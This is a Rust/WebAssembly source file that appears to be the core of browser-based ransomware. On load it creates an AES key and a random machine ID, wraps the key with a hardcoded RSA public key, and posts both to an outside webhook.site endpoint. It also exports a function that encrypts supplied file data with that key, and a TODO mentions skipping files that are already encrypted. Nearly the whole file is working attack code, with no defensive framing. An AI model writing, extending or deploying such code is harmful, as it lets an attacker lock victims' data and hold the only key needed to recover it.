mod utils;

use aes_gcm::{
    aead::{Aead, KeyInit, OsRng},
    AeadCore, Aes256Gcm, Key,
};
use base64::{engine::general_purpose::STANDARD, Engine};
use once_cell::sync::Lazy;
use rand::distributions::{Alphanumeric, DistString};
use rsa::{pkcs1::DecodeRsaPublicKey, Pkcs1v15Encrypt, RsaPublicKey};
use wasm_bindgen::prelude::*;
use wasm_bindgen_futures::JsFuture;
use web_sys::{console, RequestInit, Response};

static SERVER_URL: &str = "https://webhook.site/11d4daa1-ff9d-4d6d-9df7-864f8d1843b7";

static PUBLIC_KEY: &str = "-----BEGIN RSA PUBLIC KEY-----\nMIIBCgKCAQEAodnCUqJjbJcpWgqpGP77GVIDSTgxxJqvwU4/b0IIcKScxf/tD+tq\nPVg6rwL8Kr3uVsCQUS1GZWrQhBNYDWZzp/o51MuuXYa7RVAa20siHhir/HnQiHi/\nmXSnPIWSHOu69cNJw8A3LV73cVBV1QM6QJ2p9VyRVPe2rjKE9rgJszuBVBkf1+D+\noTjCPOOPWCNQFaP7WQZ1up+xcEvZs6xxSek1q7WUmzWkaS+6amtrF2WfVe5j1dYK\nmuzutnnW6797sMtxD5AXkJm1NLWDxkGvnQeLlKc4pLsGH8yBmYyvw+IFKG82BMdX\nLJ8CbwotJo9A7fmiWMLwjLb9Ev1xu8bhkQIDAQAB\n-----END RSA PUBLIC KEY-----";

static AES_KEY: Lazy<Key<Aes256Gcm>> = Lazy::new(|| Aes256Gcm::generate_key(OsRng));

// TODO: dont encrypt file already encrypted
#[wasm_bindgen]
pub fn encrypt(plaintext: Vec<u8>) -> Vec<u8> {
    let cipher = Aes256Gcm::new(&AES_KEY);
    let nonce = Aes256Gcm::generate_nonce(&mut OsRng);

    let ciphertext = cipher.encrypt(&nonce, plaintext.as_ref()).unwrap();
    let mut encrypted = nonce.to_vec();
    encrypted.extend_from_slice(&ciphertext);

    encrypted
}

async fn send_machine_info(machine_id: String) {
    let rsa_public_key = RsaPublicKey::from_pkcs1_pem(PUBLIC_KEY).unwrap();

    let encrypted_key = rsa_public_key
        .encrypt(&mut OsRng, Pkcs1v15Encrypt, AES_KEY.as_ref())
        .unwrap();

    let base64_encoded_body = STANDARD.encode([machine_id.into_bytes(), encrypted_key].concat());

    let mut opts = RequestInit::new();
    opts.method("POST");
    opts.body(Some(&JsValue::from_str(&base64_encoded_body)));

    let resp_value = JsFuture::from(
        web_sys::window()
            .unwrap()
            .fetch_with_str_and_init(SERVER_URL, &opts),
    )
    .await
    .unwrap();

    let resp: Response = resp_value.dyn_into().unwrap();
    let json = JsFuture::from(resp.json().unwrap()).await.unwrap();

    console::log_1(&json);
}

#[wasm_bindgen(start)]
async fn start() {
    let local_storage = web_sys::window().unwrap().local_storage().unwrap().unwrap();
    let machine_id = Alphanumeric.sample_string(&mut rand::thread_rng(), 16);

    local_storage.set_item("machine_id", &machine_id).unwrap();

    // TODO: using one key per machine
    send_machine_info(machine_id).await;
}
